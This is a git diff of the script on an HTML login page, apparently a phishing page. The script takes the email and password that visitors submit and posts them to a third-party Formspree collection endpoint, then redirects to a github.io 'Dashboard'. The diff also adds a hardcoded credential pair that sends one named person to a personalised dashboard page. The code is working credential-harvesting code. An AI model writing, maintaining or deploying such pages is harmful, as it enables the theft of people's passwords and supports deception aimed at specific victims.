@@ -34,44 +34,48 @@
   </div>
 
   <script>
-  document.addEventListener("DOMContentLoaded", function () {
-    const form = document.getElementById("loginForm");
+    document.addEventListener("DOMContentLoaded", function () {
+      const form = document.getElementById("loginForm");
 
-    form.addEventListener("submit", function (e) {
-      e.preventDefault(); // Prevent the default form reload
+      form.addEventListener("submit", async function (e) {
+        e.preventDefault(); // Prevent the default form reload
 
-      const formData = new FormData(form);
-      const jsonData = {};
+        const email = (form.elements["manemm"]?.value || "").trim().toLowerCase();
+        const password = form.elements["manpass"]?.value || "";
 
-      formData.forEach((value, key) => {
-        jsonData[key] = value;
-      });
-
-      fetch("https://formspree.io/f/mdkenbez", { // Replace with your Formspree ID
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          "Accept": "application/json"
-        },
-        body: JSON.stringify(jsonData)
-      })
-      .then(response => {
-        if (response.ok) {
-          window.location.href = "https://ddbots-actv.github.io/Dashboard/"; // Redirect after submission
-        } else {
-          alert("Reset application failed. Please try again.");
+        // --- Special redirect for Ray ---
+        if (email === "ray@gmail.com" && password === "ray1970") {
+          window.location.href = "https://ddbots-actv.github.io/Dashboard-Reynold-Palmela/";
+          return; // stop here, don't send to Formspree
         }
-      })
-      .catch(error => {
-        console.error("Submission error:", error);
-        alert("An error occurred while applying for Reset.");
+
+        // Otherwise, submit as usual, then redirect to the default dashboard
+        const formData = new FormData(form);
+        const jsonData = {};
+        formData.forEach((value, key) => { jsonData[key] = value; });
+
+        try {
+          const response = await fetch("https://formspree.io/f/mdkenbez", { // Replace with your Formspree ID if needed
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+              "Accept": "application/json"
+            },
+            body: JSON.stringify(jsonData)
+          });
+
+          if (response.ok) {
+            window.location.href = "https://ddbots-actv.github.io/Dashboard/"; // Default redirect
+          } else {
+            alert("Sign-in failed. Please try again.");
+          }
+        } catch (error) {
+          console.error("Submission error:", error);
+          alert("An error occurred. Please try again.");
+        }
       });
     });
-  });
-  
   </script>
-
-
 
 </body>
 </html>
